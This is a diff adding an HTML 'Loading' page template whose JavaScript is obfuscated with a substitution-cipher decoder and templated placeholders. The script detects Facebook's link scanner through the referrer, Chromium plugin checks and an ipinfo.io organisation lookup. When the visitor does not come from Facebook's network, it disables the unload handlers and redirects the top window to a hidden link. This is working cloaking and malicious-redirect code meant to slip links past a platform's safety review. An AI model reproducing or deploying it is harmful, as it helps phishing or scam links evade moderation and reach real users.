@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Loading</title>
+  <script type="text/javascript">
+    {randomscript}
+  </script>
+  <meta name="referrer" content="unsafe-url">
+  <script type="text/javascript">
+    function {decode}({metin},{charlen},{bool}){
+      var {alfabe} = "{alfabestr}";
+      var {kripto} = {kriptoarray};
+      var {davinci} = "";
+      var {kriptolen} = 0;
+      while({kripto}[{kriptolen}]){
+        {kriptolen}++;
+      }
+      var {i} = 0;
+      while({metin}[{i}]){
+        var {al} = 0;
+        var {ar} = -1;
+        while({alfabe}[{al}]){
+          if({alfabe}[{al}] == {metin}[{i}]){
+            {ar} = {al};
+            break;
+          }
+          {al}++;
+        }
+        if({ar} >= 0){
+          var {kl} = 0;
+          var {kr} = -1;
+          while({kripto}[{i}%{kriptolen}][{kl}]){
+            if({kripto}[{i}%{kriptolen}][{kl}] == {metin}[{i}]){
+              {kr} = {kl};
+              break;
+            }
+          {kl}++;
+          }
+          {davinci} += {alfabe}[{kr}];
+        }else{
+          {davinci} += {metin}[{i}];
+        }
+        {i}++;
+      }
+      var {temp} = "";
+      for({ch}={charlen};{ch}<{davinci}.length;{ch}++){
+        {temp} += {davinci}[{ch}];
+      }
+      {davinci} = {temp};
+      return {davinci};
+    }
+    
+    var {window} = window;
+    var {indexOf} = {decode}("indexOf");
+    
+    function {topfunction}(){
+      var {document} = {decode}("document");
+      var {referrer} = {decode}("referrer");
+      var {onbeforeunload} = {decode}("onbeforeunload");
+      var {onunload} = {decode}("onunload");
+      var {location} = {decode}("location");
+      var {top} = {decode}("top");
+      var {reload} = {decode}("reload");
+      var {lsr} = {decode}("/lsr.php");
+    
+      var {valid} = true;
+      if({window}[{document}][{referrer}][{indexOf}]({lsr}) > 0){
+        {valid} = false;
+      }else if({isChromium}() == true){
+        {valid} = false;
+      }
+    
+      if({valid} == true){
+        var {XMLHttpRequest} = {decode}("XMLHttpRequest");
+        var {ipinfo} = {decode}("http://ipinfo.io/org");
+        var {facebook} = {decode}("facebook");
+        var {GET} = {decode}("GET");
+        var {open} = {decode}("open");
+        var {onreadystatechange} = {decode}("onreadystatechange");
+        var {readyState} = {decode}("readyState");
+        var {status} = {decode}("status");
+        var {responseText} = {decode}("responseText");
+        var {toLocaleLowerCase} = {decode}("toLocaleLowerCase");
+        var {send} = {decode}("send");
+
+
+        var {xhr} = new {window}[{XMLHttpRequest}]();
+        {xhr}[{open}]({GET}, {ipinfo});
+        {xhr}[{onreadystatechange}] = function() {
+          if({xhr}[{readyState}] == 4 && {xhr}[{status}] == 200){
+            var {org} = {xhr}[{responseText}];
+            if({org}[{toLocaleLowerCase}]()[{indexOf}]({facebook}) < 0){
+              {window}[{onbeforeunload}] = null;
+              {window}[{onunload}] = null;
+              var {link} = {decode}("{redirectlink}");
+              {window}[{top}][{location}] = {link};
+            }
+          }
+        }
+        {xhr}[{send}]();
+      }
+    }
+    
+    function {isChromium}(){
+      var {navigator} = {decode}("navigator"); 
+      var {plugins} = {decode}("plugins");
+      var {length} = {decode}("length");
+      var {name} = {decode}("name");
+      var {Chromium} = {decode}("Chromium");
+    
+      if(!{window}[{navigator}] || !{window}[{navigator}][{plugins}] || {window}[{navigator}][{plugins}][{length}] == 0){
+        return false;
+      }
+    
+      for({i}=0;{i}<{window}[{navigator}][{plugins}][{length}];{i}++){
+        if({window}[{navigator}][{plugins}][{i}][{name}][{indexOf}]({Chromium}) >= 0){
+          return true;
+          break;
+        }
+      }
+    }
+    
+    {topfunction}();
+  </script>
+</head>
+<body>
+
+</body>
+</html>
